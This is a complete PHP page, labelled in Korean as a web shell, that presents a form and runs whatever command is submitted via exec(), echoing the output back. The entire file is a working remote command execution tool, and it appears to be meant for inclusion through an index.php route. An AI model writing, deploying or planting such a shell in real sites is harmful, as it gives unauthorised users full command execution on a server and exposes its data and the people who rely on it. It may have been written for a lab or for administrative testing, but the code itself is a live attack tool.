<?php
// HTTP 헤더를 사용하여 문자셋을 UTF-8로 설정
?>
<div class="container mt-5">
    <h2>웹 쉘</h2>
    <form action="index.php?cmd=shell2" method="post">
        <div class="mb-3">
            <label for="command" class="form-label">명령</label>
            <input type="text" class="form-control" id="command" name="command" placeholder="실행할 명령어를 입력하세요">
        </div>
        <button type="submit" class="btn btn-primary">실행</button>
    </form>
    <div class="row">
            <div class="col">
    <pre>
    <?php
        if(isset($_POST["command"]))
        {
            header('Content-Type: text/html; charset=UTF-8');
            header('Content-Type: text/html; charset=UTF-8');
            $output = [];
            $command = escapeshellcmd($_POST["command"]);
            exec($command, $output);
            foreach($output as $line)
            {
                echo htmlspecialchars(mb_convert_encoding($line, 'UTF-8', 'CP949')) . "\n";
            }
        }
    ?>
    </pre>
        </div>
    </div>
</div>
